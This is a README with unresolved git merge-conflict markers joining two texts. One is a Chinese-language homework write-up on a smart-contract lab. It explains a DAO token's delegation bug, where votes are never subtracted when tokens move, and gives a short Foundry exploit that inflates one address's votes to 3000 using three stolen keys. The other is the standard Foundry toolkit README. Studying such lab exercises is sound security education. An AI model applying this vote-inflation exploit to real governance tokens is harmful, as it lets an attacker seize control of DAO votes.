<<<<<<< HEAD
W2

大前提 hacker 取得三位使用者的 private key

### 合約漏洞
- 首先是 `mapping(address => address) internal _delegates;` 
這個變數的問題，這個變數是用來記錄使用者的代表人，但是這個變數是 `internal` 的，所以可以直接透過 `delegate` 這個函數來修改其他使用者的代表人。

- mapping 還沒產生時，會是空值，所以透過 `_delegates[_addr]` 來取值時，會是 0x0000000000000000000000000000000000000000
- 然而 `_moveDelegates` if (from != to && amount > 0) 這個判斷式，只要 from != to 就會執行，
- 所以只要 from 是 0x if (from != address(0)) 跳過，只執行 if (to != address(0)) 這個判斷式。
這騷操作，確實不好看....。

```js
    function delegate(address _addr) external {
        // msg.sender: 0x0000000000000000000000000000000000000001
        // hacker: 0x0000000000000000000000000000000000001337
        return _delegate(msg.sender, _addr);
    }
    function _delegate(address _addr, address delegatee) internal {
        address currentDelegate = _delegates[_addr]; // 還沒設定前 _delegates[_addr] 還是空 所以回傳遞只會是 0x0000000000000000000000000000000000000000
        uint256 _addrBalance = balanceOf(_addr);
        _delegates[_addr] = delegatee;
        _moveDelegates(currentDelegate, delegatee, _addrBalance);
    }
    function _moveDelegates(address from, address to, uint256 amount) internal {
        if (from != to && amount > 0) {
            if (from != address(0)) {
                uint32 fromNum = numCheckpoints[from];
                uint256 fromOld = fromNum > 0 ? checkpoints[from][fromNum - 1].votes : 0;
                uint256 fromNew = fromOld - amount;
                _writeCheckpoint(from, fromNum, fromOld, fromNew);
            }

            if (to != address(0)) {
                uint32 toNum = numCheckpoints[to];
                uint256 toOld = toNum > 0 ? checkpoints[to][toNum - 1].votes : 0;
                uint256 toNew = toOld + amount;
                _writeCheckpoint(to, toNum, toOld, toNew);
            }
        }
    }
```

### 攻擊方式


過程

- 1. hacker 使用 alice 的 錢包地址，執行 `delegate` 函數，將 alice 的代表人設定為 hacker 自己，hacker 代表人獲得 1000 vote。
- 2. hacker 使用 alice 的 錢包地址，執行 `transfer` 函數，將 1000 token 轉給 bob。
- 3. hacker 使用 bob 的 錢包地址，執行 `delegate` 函數，將 bob 的代表人設定為 hacker 自己，hacker 代表人獲得 2000 vote。
- 4. hacker 使用 bob 的 錢包地址，執行 `transfer` 函數，將 1000 token 轉給 carl。
- 5. hacker 使用 carl 的 錢包地址，執行 `delegate` 函數，將 carl 的代表人設定為 hacker 自己，hacker 代表人獲得 3000 vote。
- 6. hacker 使用 carl 的 錢包地址，執行 `transfer` 函數，將 1000 token 轉給自己，取得代幣完美收場。


```js
  vm.startPrank(alice); // hacker using alice address
  // write your soluiton here
  daoToken.delegate(hacker); // alice delegate to hacker -> hacker vote = 1000
  daoToken.transfer(bob, 1000); // hacker using alice address send token to bob
  vm.startPrank(bob); // hacker using bob address
  daoToken.delegate(hacker); // bob delegate to hacker -> hacker vote = 2000
  daoToken.transfer(carl, 1000); // hacker using bob address send token to carl
  vm.startPrank(carl); // hacker using carl address
  daoToken.delegate(hacker); // carl delegate to hacker -> hacker vote = 3000
  daoToken.transfer(hacker, 1000); // hacker using carl address send token to hacker
```


團體作業補充回答：

https://hackmd.io/@jlUcRpm-QcOwe2cxBxjf4w/Sk07j_php
=======
## Foundry

**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**

Foundry consists of:

-   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
-   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
-   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
-   **Chisel**: Fast, utilitarian, and verbose solidity REPL.

## Documentation

https://book.getfoundry.sh/

## Usage

### Build

```shell
$ forge build
```

### Test

```shell
$ forge test
```

### Format

```shell
$ forge fmt
```

### Gas Snapshots

```shell
$ forge snapshot
```

### Anvil

```shell
$ anvil
```

### Deploy

```shell
$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
```

### Cast

```shell
$ cast <subcommand>
```

### Help

```shell
$ forge --help
$ anvil --help
$ cast --help
```
>>>>>>> main
